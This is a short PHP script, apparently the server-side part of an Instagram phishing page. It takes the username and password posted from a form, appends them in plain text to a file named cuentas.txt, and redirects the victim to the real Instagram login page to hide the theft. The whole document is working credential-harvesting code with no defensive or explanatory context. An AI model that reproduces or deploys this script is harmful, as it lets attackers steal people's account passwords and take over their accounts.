<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $usuario = $_POST['usuario'];
    $contrasena = $_POST['contrasena'];
    
    $data = "Usuario: $usuario, Contraseña: $contrasena\n";
    
    file_put_contents('cuentas.txt', $data, FILE_APPEND);
    
    header('Location: https://www.instagram.com/accounts/login/');
    exit();
}
?>
